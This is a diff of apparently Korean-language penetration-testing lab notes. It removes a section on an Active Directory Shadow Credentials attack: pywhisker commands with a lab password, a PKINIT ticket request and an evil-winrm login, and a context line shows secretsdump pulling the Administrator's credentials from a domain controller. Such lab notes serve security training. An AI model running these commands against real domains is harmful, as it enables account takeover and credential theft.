@@ -861,36 +861,6 @@ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrat
 
 ---
 <details>
-  <summary><strong>Shadow Credentials Attack</strong></summary>
-
-msDS-KeyCredentialLink 속성에 인증서 추가하여 PKINIT 사용
-
-### pywhisker로 Shadow Credential 생성
-```bash
-pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
-```
-- 대상 사용자의 msDS-KeyCredentialLink에 인증서 키 추가
-- WriteProperty 권한 필요
-
-### 인증서로 TGT 요청
-```bash
-python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
-export KRB5CCNAME=/tmp/jpinkman.ccache
-klist
-```
-
-### Evil-WinRM 접속
-```bash
-cat /etc/krb5.conf
-evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
-```
-- Kerberos 티켓으로 WinRM 인증
-<img width="612" height="389" alt="image" src="https://github.com/user-attachments/assets/0e6f5184-851c-460a-a00a-40dd9b3e0495" />
-  
-</details>
-
----
-<details>
   <summary><strong>KeePass</strong></summary>
 
 ### 파일 찾기
